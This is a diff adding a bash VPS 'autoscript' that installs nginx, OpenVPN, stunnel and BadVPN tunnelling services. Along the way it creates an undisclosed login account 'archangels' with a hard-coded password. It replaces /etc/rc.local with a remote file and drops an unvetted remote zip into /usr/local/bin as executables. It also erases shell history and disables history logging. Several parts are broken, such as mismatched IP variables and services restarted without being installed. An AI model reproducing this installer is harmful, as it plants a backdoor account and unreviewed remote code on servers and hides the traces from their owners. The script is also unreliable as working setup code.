@@ -1,0 +1,259 @@
+#!/bin/bash
+# R3V1V3R
+# 1NT3RN3T
+# L1VR3
+
+corPadrao="\033[0m"
+preto="\033[0;30m"
+vermelho="\033[0;31m"
+verde="\033[0;32m"
+marrom="\033[0;33m"
+azul="\033[0;34m"
+purple="\033[0;35m"
+cyan="\033[0;36m"
+cinzaClaro="\033[0;37m"
+pretoCinza="\033[1;30m"
+vermelhoClaro="\033[1;31m"
+verdeClaro="\033[1;32m"
+amarelo="\033[1;33m"
+azulClaro="\033[1;34m"
+purpleClaro="\033[1;35m"
+cyanClaro="\033[1;36m"
+branco="\033[1;37m"
+clear
+echo -e "\033[1;30m------------------------------------------------\033[1;37m"
+echo -e "               .                                "
+echo -e "           .XG@B@@1                             "  
+echo -e "           @B@@@B@                              "
+echo -e "           B@B@B@M          ,,::i.              "
+echo -e "           @B@BOO@qi       iLPSF5X:             "
+echo -e "           B@Bri2B@B@:    PB@Bkri7v,            "    
+echo -e "           @B@     7@Z   :BN                    "
+echo -e "           B@B@ii:  :B0  .7 .i77i.P:            "
+echo -e "           @B:7GB@M7B@@,    k@B@XrBS            "
+echo -e "           B0       @B@r                        "
+echo -e "           @L      8B@B:                        " 
+echo -e "           XO     @B@B@      ,.                 "
+echo -e "           :B.j0Pii7G@B  .;   :7FSX.            "
+echo -e "            @:LB@:   .@B@@r   .BMB.             "
+echo -e "            .@.jiBB@B@@:.@B@B@B:L7              " 
+echo -e "             :@v5   .:.   .:.  uX               "
+echo -e "              .@2F    :Jij    EL                "
+echo -e "                MNL    @@J  ,k.                 "
+echo -e "                 UBv   @BE .U                   "
+echo -e "                  :E7 .B@B .                    "
+echo -e "                    i  @Br                      "
+echo -e "                       @                        " 
+echo -e "                                                "  
+echo -e "------------------------------------------------\033[0m"
+
+sleep 5
+
+tput setaf 8 ; tput setab 5 ; tput bold ; printf '%30s%s%-18s\n' "R3V1V3R" ; tput sgr0
+echo ""
+echo ""
+echo -e "\033[1;34m INSTALANDO...\033[1;32m"
+
+sleep 5
+
+export DEBIAN_FRONTEND=noninteractive
+OS=`uname -m`;
+MYIP=$(wget -qO- ipv4.icanhazip.com);
+MYIP2="s/xxxxxxxxx/$MYIP/g";
+
+# go to root
+cd
+cat /etc/[A-Za-z]*[_-][rv]e[lr]* ;
+sleep 5
+
+# stop/remove services
+killall apache2
+apt-get purge apache2 -y
+apt-get -y --purge remove samba*
+apt-get -y --purge remove exim4*
+apt-get -y --purge remove sendmail*
+apt-get -y --purge remove bind9*
+
+# disable ipv6
+echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
+sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
+
+# install wget, sudo and curl
+apt-get update;apt-get -y install wget sudo curl;
+apt install dos2unix
+
+# set time GMT -3
+ln -fs /usr/share/zoneinfo/America/Sao_Paulo /etc/localtime
+
+# set locale
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+service sshd restart
+
+# set repo
+wget -O /etc/apt/sources.list "https://raw.githubusercontent.com/redeviver/script/master/sources.list.debian8"
+wget "http://www.dotdeb.org/dotdeb.gpg"
+cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg
+sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
+wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
+
+# update
+apt-get update
+
+# install webserver
+apt-get -y install nginx
+
+# install essential package
+apt-get -y install nano iptables dnsutils openvpn screen whois ngrep nload nmap unzip unrar zip
+
+# install neofetch
+echo "deb http://dl.bintray.com/dawidd6/neofetch jessie main" | tee -a /etc/apt/sources.list
+curl "https://bintray.com/user/downloadSubjectPublicKey?username=bintray"| apt-key add -
+apt-get update
+apt-get install neofetch
+
+echo "deb http://dl.bintray.com/dawidd6/neofetch jessie main" | tee -a /etc/apt/sources.list
+curl "https://bintray.com/user/downloadSubjectPublicKey?username=bintray"| apt-key add -
+apt-get update
+apt-get install neofetch
+echo "clear" >> .bash_profile
+echo "menu" >> .bash_profile
+
+# install webserver
+cd
+rm /etc/nginx/sites-enabled/default
+rm /etc/nginx/sites-available/default
+wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/redeviver/script/master/nginx.conf"
+mkdir -p /home/vps/public_html
+wget -O /home/vps/public_html/index.html "https://raw.githubusercontent.com/redeviver/script/master/index.html" > /home/vps/public_html/index.html
+wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/redeviver/script/master/vps.conf"
+service nginx restart
+
+#  openvpn
+apt-get -y install openvpn
+cd /etc/openvpn/
+wget -O openvpn.tar "https://gakod.com/AUTOVPS/openvpn.tar"
+tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/rc.local "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/rc.local"
+chmod +x /etc/rc.local
+# etc
+wget -O /home/vps/public_html/client.ovpn "https://gakod.com/AUTOVPS/client.ovpn"
+wget -O /home/vps/public_html/udp.ovpn "https://gakod.com/AUTOVPS/udp.ovpn"
+wget -O /home/vps/public_html/client1.ovpn "https://raw.githubusercontent.com/BangJaguh/VPN/main/c/client1.ovpn"
+wget -O /home/vps/public_html/client3.ovpn "https://gakod.com/debian/client3.ovpn"
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/udp.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client1.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client3.ovpn
+useradd -m -g users -s /bin/bash archangels
+echo "7C22C4ED" | chpasswd
+echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
+cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
+ 
+# install stunnel
+apt-get -y install stunnel4
+cat > /etc/stunnel/stunnel.conf <<-END
+cert = /etc/stunnel/stunnel.pem
+pid = /stunnel.pid
+
+client = no	
+socket = a:SO_REUSEADDR=1
+socket = l:TCP_NODELAY=1
+socket = r:TCP_NODELAY=1
+
+[dropbear]
+accept = 442
+connect = 127.0.0.1:444
+connect = 127.0.0.1:109
+connect = 127.0.0.1:110
+
+[ssh]
+accept = 21
+connect = 127.0.0.1:143
+
+[openvpn]
+accept = 587
+connect = 127.0.0.1:443
+END
+
+#membuat sertifikat
+openssl genrsa -out key.pem 2048
+openssl req -new -x509 -key key.pem -out cert.pem -days 1095 \
+-subj "/C=$country/ST=$state/L=$locality/O=$organization/OU=$organizationalunit/CN=$commonname/emailAddress=$email"
+cat key.pem cert.pem >> /etc/stunnel/stunnel.pem
+
+#konfigurasi stunnel
+sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
+/etc/init.d/stunnel4 restart
+
+# install vnstat gui
+cd /home/vps/public_html/
+wget https://raw.githubusercontent.com/sslmode/sslmode/master/vnstat_php_frontend-1.5.1.tar.gz
+tar xf vnstat_php_frontend-1.5.1.tar.gz
+rm vnstat_php_frontend-1.5.1.tar.gz
+mv vnstat_php_frontend-1.5.1 vnstat
+cd vnstat
+sed -i "s/\$iface_list = array('eth0', 'sixxs');/\$iface_list = array('eth0');/g" config.php
+sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
+sed -i 's/Internal/Internet/g' config.php
+sed -i '/SixXS IPv6/d' config.php
+sed -i "s/\$locale = 'en_US.UTF-8';/\$locale = 'en_US.UTF+8';/g" config.php
+cd
+clear
+# Install BadVPN
+apt-get -y install cmake make gcc
+wget https://raw.githubusercontent.com/GegeEmbrie/autosshvpn/master/file/badvpn-1.999.127.tar.bz2
+tar xf badvpn-1.999.127.tar.bz2
+mkdir badvpn-build
+cd badvpn-build
+cmake ~/badvpn-1.999.127 -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_UDPGW=1
+make install
+screen badvpn-udpgw --listen-addr 127.0.0.1:7300 > /dev/null &
+cd
+
+# Configure menu
+apt-get install unzip
+cd /usr/local/bin/
+wget "https://raw.githubusercontent.com/padubang/secret/main/Ndnd/premiummenu.zip" 
+unzip premiummenu.zip
+chmod +x /usr/local/bin/*
+cd
+
+# finishing
+cd
+chown -R www-data:www-data /home/vps/public_html
+/etc/init.d/nginx restart
+/etc/init.d/openvpn restart
+/etc/init.d/cron restart
+/etc/init.d/ssh restart
+/etc/init.d/dropbear restart
+/etc/init.d/fail2ban restart
+/etc/init.d/webmin restart
+/etc/init.d/stunnel4 restart
+/etc/init.d/squid start
+rm -rf ~/.bash_history && history -c
+echo "unset HISTFILE" >> /etc/profile
+
+clear
+# SELASAI SUDAH BOSS! ( sam.Tk )
+echo "========================================"  | tee -a log-install.txt
+echo "Service Autoscript inject69 (NOBITA inject69 2017)"  | tee -a log-install.txt
+echo "----------------------------------------"  | tee -a log-install.txt
+echo ""  | tee -a log-install.txt
+echo "nginx : http://$myip:80"   | tee -a log-install.txt
+echo "Webmin : http://$myip:10000/"  | tee -a log-install.txt
+echo "Squid3 : 8080"  | tee -a log-install.txt
+echo "OpenSSH : 22"  | tee -a log-install.txt
+echo "Dropbear : 443"  | tee -a log-install.txt
+echo "OpenVPN  : TCP 1194 (DAPATKAN OVPN DARI SAYA)"  | tee -a log-install.txt
+echo "Fail2Ban : [on]"  | tee -a log-install.txt
+echo "Timezone : Asia/Kuala_Lumpur"  | tee -a log-install.txt
+echo "Menu : type menu to check menu script"  | tee -a log-install.txt
+echo ""  | tee -a log-install.txt
+echo "----------------------------------------"
+echo "LOG INSTALL  --> /root/log-install.txt"
+echo "----------------------------------------"
+echo "========================================"  | tee -a log-install.txt
+echo "      PLEASE REBOOT TO TAKE EFFECT !"
+echo "========================================"  | tee -a log-install.txt
+cat /dev/null > ~/.bash_history && history -c
